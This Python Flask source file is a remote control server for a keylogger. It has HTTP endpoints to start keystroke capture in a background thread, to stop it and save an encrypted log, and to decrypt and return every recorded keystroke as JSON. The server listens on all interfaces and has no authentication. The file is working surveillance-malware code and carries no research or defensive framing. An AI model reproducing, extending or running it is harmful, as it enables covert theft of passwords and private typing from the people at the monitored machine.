from flask import Flask, jsonify
import threading
from logger import KeyLogger
from encryptor import Encryptor
import time

app = Flask(__name__)

# Global variables for the keylogger and thread
keylogger = None
keylogger_thread = None
log_file_path = "logs/keystrokes.log"

# Load the encryption key
with open("key.key", "rb") as key_file:
    key = key_file.read()
encryptor = Encryptor(key)

@app.route('/start', methods=['POST'])
def start_keylogger():
    global keylogger, keylogger_thread
    if keylogger_thread is None or not keylogger_thread.is_alive():
        keylogger = KeyLogger(log_file_path)
        keylogger_thread = threading.Thread(target=keylogger.start_logging)
        keylogger_thread.start()
        return jsonify({"status": "Keylogger started"})
    return jsonify({"status": "Keylogger already running"})

@app.route('/stop', methods=['POST'])
def stop_keylogger():
    global keylogger, keylogger_thread
    if keylogger_thread and keylogger_thread.is_alive():
        keylogger.stop_logging()  # Signal the keylogger to stop
        keylogger_thread.join()  # Wait for the thread to finish

        # Encrypt and save logs
        log_data = keylogger.save_log()
        encrypted_data = encryptor.encrypt_data(log_data)
        with open(log_file_path, "wb") as log_file:
            log_file.write(encrypted_data)

        return jsonify({"status": "Keylogger stopped", "message": "Encrypted log saved."})
    return jsonify({"status": "Keylogger is not running"})

@app.route('/view-log', methods=['GET'])
def view_log():
    try:
        # Read the encrypted log file
        with open(log_file_path, "rb") as log_file:
            encrypted_data = log_file.read()
        
        # Decrypt the log data
        decrypted_log = encryptor.decrypt_data(encrypted_data)
        
        # Structure the log for better readability so far this is better Readability
        log_entries = []
        for line in decrypted_log.strip().split('\n'):
            if line:  # Ensure the line is not empty
                timestamp, key = line.split(' - ', 1)  # Split on the first ' - '
                log_entries.append({"timestamp": timestamp, "key": key})

        return jsonify({"log": log_entries})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
